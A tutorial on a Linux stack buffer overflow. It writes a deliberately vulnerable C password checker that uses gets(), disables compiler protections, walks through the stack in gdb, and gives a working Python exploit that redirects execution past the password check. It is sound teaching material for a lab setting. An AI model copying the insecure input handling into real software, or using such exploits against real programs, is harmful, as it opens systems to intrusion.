### 1. Simple Linux Buffer Overflow

##### Writing a vulnerable program

This very simple C program asks for a password. The function test_pw uses bitwise manipulations to do some basic obfuscation of the correct password.

```
#include <stdio.h>

int test_pw() {
	// Reserve space for 10 characters.
	char pin[10];
	int x = 15, i;
	
	printf("Enter the password: ");
	// Accept user input without checking its length.
	gets(pin);
	
	// Flip some bits around so the password is not obvious.
	for (i = 0; i < 10; i+=2) {
		x = (x & pin[i]) | pin[i+1];
	}

	if (x == 48) {
		return 0;
	} else {
		return 1;
	}
}

void main() {
	if (test_pw()) {
		printf("Fail!\n");
	} else {
		printf("You win!\n");
	}
}

```

The gets statement on line 10 is problematic because it does not check the user's input. We can overflow the pin and overwrite memory to bypass the password.

We compile the program with the following options to disable protections on the binary and enable symbols for gdb. We are also setting the memory location manually to make things easier.

```
gcc -g p2buf.c -o p2buf --no-pie -Wl,--section-start=.text=0x08040000 -fno-stack-protector -z execstack
```


##### Debugging
Because we enabled debug symbols, we can set breakpoints on the lines of code in gdb. If we set a breakpoint at line 10 before the gets call and examine the stack, this is what we see:

```
gdb-peda$ x/20x $esp            
0xbfffefc0:     0xb7fb7000      0xb7fb7000      0x00000000      0xb7e0f60b
0xbfffefd0:     0xb7fb73fc      0x08441fd0      0xbffff0b0      0x0000000f
0xbfffefe0:     0x00000002      0xbffff0a4      0xbfffeff8      0x084401cc
0xbfffeff0:     0xb7fe79b0      0xbffff010      0x00000000      0xb7df7e81
0xbffff000:     0xb7fb7000      0xb7fb7000      0x00000000      0xb7df7e81

gdb-peda$ x/x $ebp
0xbfffefe8:     0xbfffeff8
```

From 0xb7fb7000 (esp address) to 0xbfffeff8 (ebp address) is the stack frame for the test_pw function. The address 0x084401cc is the return address.

We continue the program and input AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRSSTT for the password. If we examine the stack now, we can see that we have overwritten some data.

```
gdb-peda$ x/20x $esp
0xbfffefd0:     0xb7fb7000      0xb7fb7000      0x00000000      0x4141f60b
0xbfffefe0:     0x43434242      0x45454444      0x0000000a      0x00000045
0xbfffeff0:     0x4b4b4a4a      0x4d4d4c4c      0x4f4f4e4e      0x51515050
0xbffff000:     0x53535252      0xbf005454      0x00000000      0xb7df7e81
0xbffff010:     0xb7fb7000      0xb7fb7000      0x00000000      0xb7df7e81

gdb-peda$ x/x $ebp
0xbfffeff8:     0x4f4f4e4e
```

We can see that the return value (after ebp) has been overwritten to 0x51515050. (PPQQ) This means we can control program execution with our input.

Where to jump to? If we disassemble main, we can see two puts calls. The second one is what we want. That's when it prints that we have the correct password.

```
0x084401d8 <+34>:    call   0xb7e46b40 <_IO_puts>
   0x084401dd <+39>:    add    esp,0x10 
   0x084401e0 <+42>:    jmp    0x84401f2 <main+60> 
   0x084401e2 <+44>:    sub    esp,0xc
   0x084401e5 <+47>:    push   0x844029b 
   0x084401ea <+52>:    call   0xb7e46b40 <_IO_puts>
```

So, let's redirect eip to address 0x084401e2.

##### Writing the exploit

The exploit is a simple python script.

```
#!/usr/bin/python

import struct
import sys

padding = "AABBCCDDEEFFGGHHIIJJKKLLMMNNOO"
eip = struct.pack("I", 0x084401e2)
payload = padding + eip

sys.stdout.write(payload)
```

Let's make it executable and write the output to a file.
```
chmod +x exploit.py
./exploit > exploit
```

And if we run it in gdb, at the end of test_pw, we can see that once esp pops back into eip, eip will point to our desired address.

```
gdb-peda$ run < exploit


=> 0x84401b5 <test_pw+120>:     ret 

x/x $esp
0xbfffeffc:     0x084401e2
```

Let's also run it against the program outside of the debugger to verify it works.

```
$ ./p2buf < exploit 
Enter the password: You win!
Segmentation fault (core dumped)
```
